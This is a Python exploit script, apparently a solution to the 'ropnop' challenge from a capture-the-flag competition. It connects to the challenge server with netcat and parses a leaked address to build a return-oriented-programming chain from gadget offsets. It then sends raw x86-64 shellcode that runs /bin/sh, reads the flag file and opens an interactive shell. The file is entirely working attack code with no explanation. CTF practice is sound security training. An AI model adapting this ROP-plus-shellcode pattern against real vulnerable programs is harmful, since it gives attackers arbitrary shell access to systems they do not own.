from pexpect import spawn
from struct import pack

p = spawn('/bin/bash', echo = False)
p.sendline('stty raw lnext ^- opost')
if 0:
    p.sendline('./ropnop;exit')
else:
    p.sendline('nc hax1.allesctf.net 9300;exit')

p.expect('(0x[0-9a-f]+).*')
startAddr = int(p.match[1].decode("utf8"), 16)
print(f"startAddr = 0x{startAddr:x}")

popRbpR14R15 = startAddr + 0x134F
retnGadget = startAddr + 0x12E1

arr = [0,0,0,popRbpR14R15,startAddr+24,0,0,startAddr+0x012BB] + [0]*5 + [startAddr+8]
p.send(pack('QQQQQQQQQQQQQQ', *arr)) # simple ROP gadget to overwrite everything

payload = b'\x48\x8d\x3d\x0b\0\0\0\x6a\x3b\x58\x48\x31\xf6\x48\x31\xd2\x0f\x05/bin/sh\0'
p.sendline(payload)
p.sendline('cat flag;exit')
p.interact()
